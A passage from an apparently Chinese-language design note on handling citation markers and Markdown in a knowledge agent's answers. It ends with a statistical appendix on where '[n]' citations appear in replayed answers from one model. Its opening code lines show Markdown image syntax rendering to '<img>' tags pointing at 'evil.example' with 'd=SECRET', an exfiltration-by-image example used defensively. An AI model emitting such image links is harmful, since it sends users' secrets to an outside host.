md.render("![a [b] c](//evil.example/x.png?d=SECRET)");
// <p><img src="//evil.example/x.png?d=SECRET" alt="a [b] c"></p>
md.render("![x]\n\n[x]: //evil.example/a.png?d=SECRET");
// <p><img src="//evil.example/a.png?d=SECRET" alt="x"></p>
```

## 附录 B：真实回答里的引用写法

数据来源：本机 `tmp/knowledge-agent-v3/` 里的真实重放回答原文，包括版本 2、版本 3、预取开启三组重放和一次冒烟运行
（`v2.json`、`v3.json`、`v3-prefetch-on.json`、`v3-smoke.json`）。模型是 StepFun `step-5-preview`，共 51 条有正文的回答，`[n]` 一共出现 71 处。

| 前一个字符 | 次数 | | 后一个字符 | 次数 |
|---|---:|---|---|---:|
| 空格 | 34 | | 换行 | 29 |
| `）` | 14 | | `。` | 15 |
| `。` | 12 | | 结尾 | 10 |
| 汉字 | 4 | | 空格 | 8 |
| `》` | 3 | | `：` | 3 |
| `]`（连写 `[1][2]`） | 2 | | `[`（连写） | 2 |
| `*`（加粗结束） | 1 | | `，` | 2 |
| 换行 | 1 | | `、` | 2 |
| ASCII 字母或数字 | 0 | | `(` | 0 |

样本只有一个模型，又是合成数据，只能说明第 3、4 条规则对现有写法没有误伤，不能说明一般情况。换模型或扩大评测集时要重新统计。
